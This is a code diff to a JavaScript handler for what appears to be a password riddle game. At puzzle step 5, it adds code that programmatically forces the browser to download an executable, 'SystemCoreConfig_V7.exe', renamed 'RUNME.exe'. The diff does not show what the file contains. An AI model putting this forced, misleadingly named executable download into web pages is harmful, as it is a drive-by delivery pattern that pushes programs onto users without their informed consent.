@@ -115,6 +115,13 @@ form.addEventListener('submit', async (e) => {
       alert("4. So you'd pursue the deeper truth? It isn't one the weak could bear. Prove yourself ready to face it. I'll not hold back. My _____ is lethal and I'd feel no sadness in a weakling's demise. Show me you can accept this Kingdom's past and claim responsibility for its future.");
       });
     }
+    if (passwordStep == 5) {
+      const link = document.createElement("a");
+      link.href = "RootConfig/SystemCoreConfig_V7.exe";
+      link.download = "RUNME.exe";document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link); 
+    } 
   } else {
     inputGroup.className = 'input-group incorrect';
     alert('Password incorrect! Try again.');
